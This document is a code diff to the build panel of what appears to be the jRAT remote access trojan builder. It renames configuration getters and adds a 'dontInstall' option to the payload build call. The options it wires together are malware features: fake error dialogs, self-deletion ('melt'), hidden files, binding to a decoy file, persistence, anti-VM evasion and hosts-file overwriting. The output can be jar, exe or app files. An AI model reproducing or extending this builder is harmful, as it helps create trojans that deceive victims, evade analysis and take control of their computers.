@@ -187,16 +187,17 @@ public class PanelBuildFinal extends JPanel {
 					String[] addresses = network.getAddresses();
 					String ID = general.getID();
 					String pass = general.getPass();
-					int droppath = startup.droploc();
+					boolean dontInstall = startup.dontInstall();
+					int droppath = startup.getDropLocation();
 					int reconSec = network.getConnectionRate();
-					String name = startup.getJarname();
+					String name = startup.getJarName();
 					boolean fakewindow = message.shouldShowDialog();
 					String faketitle = message.getTitle();
 					String fakemessage = message.getMsg();
 					int fakeicon = message.getIcon();
-					boolean melt = startup.melt();
-					boolean hiddenFile = startup.hideFile();
-					boolean runNextBoot = startup.runNext();
+					boolean melt = startup.shouldMelt();
+					boolean hiddenFile = startup.shouldHideFile();
+					boolean runNextBoot = startup.shouldRunNextBoot();
 					boolean bind = binder.shouldBind();
 					String bindpath = binder.getFile();
 					String bindname = binder.getFileName();
@@ -206,9 +207,9 @@ public class PanelBuildFinal extends JPanel {
 					PluginList plist = pl.getList();
 					boolean timeout = ti.enabled();
 					int timeoutms = ti.getSecondsAsMilli();
-					boolean delay = de.delay();
+					boolean delay = de.useDelay();
 					int delayms = de.getDelayAsSeconds();
-					boolean usehost = host.enabled();
+					boolean usehost = host.isEnabled();
 					String hosttext = host.getText();
 					boolean overwritehost = host.overwrite();
 					boolean trayicon = vis.useIcon();
@@ -230,7 +231,7 @@ public class PanelBuildFinal extends JPanel {
 
 					if (out.useShellcode()) {
 						File temp = File.createTempFile("jratbuild", ".jar");
-						Build.build(new AdvancedBuildListener(frame), Globals.getStub(), temp, addresses, ID, pass, droppath, reconSec, name, fakewindow, faketitle, fakemessage, fakeicon, melt, runNextBoot, hiddenFile, bind, bindpath, bindname, binddrop, usemutex, mutexport, plist, timeout, timeoutms, delay, delayms, usehost, hosttext, overwritehost, trayicon, icon, traymsg, traymsgfail, traytitle, handleerr, persistance, persistancems, debugmsg, osconfig, true, config, antivm);
+						Build.build(new AdvancedBuildListener(frame), Globals.getStub(), temp, addresses, ID, pass, dontInstall, droppath, reconSec, name, fakewindow, faketitle, fakemessage, fakeicon, melt, runNextBoot, hiddenFile, bind, bindpath, bindname, binddrop, usemutex, mutexport, plist, timeout, timeoutms, delay, delayms, usehost, hosttext, overwritehost, trayicon, icon, traymsg, traymsgfail, traytitle, handleerr, persistance, persistancems, debugmsg, osconfig, true, config, antivm);
 
 						if (!file.endsWith(".jar")) {
 							file = file + ".jar";
@@ -241,7 +242,7 @@ public class PanelBuildFinal extends JPanel {
 					} else if (out.useExe()) {
 						File temp = File.createTempFile("jratbuild", ".jar");
 
-						Build.build(new AdvancedBuildListener(frame), Globals.getStub(), temp, addresses, ID, pass, droppath, reconSec, name, fakewindow, faketitle, fakemessage, fakeicon, melt, runNextBoot, hiddenFile, bind, bindpath, bindname, binddrop, usemutex, mutexport, plist, timeout, timeoutms, delay, delayms, usehost, hosttext, overwritehost, trayicon, icon, traymsg, traymsgfail, traytitle, handleerr, persistance, persistancems, debugmsg, osconfig, true, config, antivm);
+						Build.build(new AdvancedBuildListener(frame), Globals.getStub(), temp, addresses, ID, pass, dontInstall, droppath, reconSec, name, fakewindow, faketitle, fakemessage, fakeicon, melt, runNextBoot, hiddenFile, bind, bindpath, bindname, binddrop, usemutex, mutexport, plist, timeout, timeoutms, delay, delayms, usehost, hosttext, overwritehost, trayicon, icon, traymsg, traymsgfail, traytitle, handleerr, persistance, persistancems, debugmsg, osconfig, true, config, antivm);
 
 						if (!file.toLowerCase().endsWith(".exe")) {
 							file = file + ".exe";
@@ -253,7 +254,7 @@ public class PanelBuildFinal extends JPanel {
 					} else if (out.useApp()) {
 						File temp = File.createTempFile("jratbuild", ".jar");
 
-						Build.build(new AdvancedBuildListener(frame), Globals.getStub(), temp, addresses, ID, pass, droppath, reconSec, name, fakewindow, faketitle, fakemessage, fakeicon, melt, runNextBoot, hiddenFile, bind, bindpath, bindname, binddrop, usemutex, mutexport, plist, timeout, timeoutms, delay, delayms, usehost, hosttext, overwritehost, trayicon, icon, traymsg, traymsgfail, traytitle, handleerr, persistance, persistancems, debugmsg, osconfig, true, config, antivm);
+						Build.build(new AdvancedBuildListener(frame), Globals.getStub(), temp, addresses, ID, pass, dontInstall, droppath, reconSec, name, fakewindow, faketitle, fakemessage, fakeicon, melt, runNextBoot, hiddenFile, bind, bindpath, bindname, binddrop, usemutex, mutexport, plist, timeout, timeoutms, delay, delayms, usehost, hosttext, overwritehost, trayicon, icon, traymsg, traymsgfail, traytitle, handleerr, persistance, persistancems, debugmsg, osconfig, true, config, antivm);
 
 						if (!file.toLowerCase().endsWith(".app")) {
 							file = file + ".app";
@@ -263,7 +264,7 @@ public class PanelBuildFinal extends JPanel {
 
 						temp.delete();
 					} else {				
-						Build.build(new AdvancedBuildListener(frame), Globals.getStub(), new File(file), addresses, ID, pass, droppath, reconSec, name, fakewindow, faketitle, fakemessage, fakeicon, melt, runNextBoot, hiddenFile, bind, bindpath, bindname, binddrop, usemutex, mutexport, plist, timeout, timeoutms, delay, delayms, usehost, hosttext, overwritehost, trayicon, icon, traymsg, traymsgfail, traytitle, handleerr, persistance, persistancems, debugmsg, osconfig, true, config, antivm);		
+						Build.build(new AdvancedBuildListener(frame), Globals.getStub(), new File(file), addresses, ID, pass, dontInstall, droppath, reconSec, name, fakewindow, faketitle, fakemessage, fakeicon, melt, runNextBoot, hiddenFile, bind, bindpath, bindname, binddrop, usemutex, mutexport, plist, timeout, timeoutms, delay, delayms, usehost, hosttext, overwritehost, trayicon, icon, traymsg, traymsgfail, traytitle, handleerr, persistance, persistancems, debugmsg, osconfig, true, config, antivm);		
 					}
 
 					String rawAddresses = "";
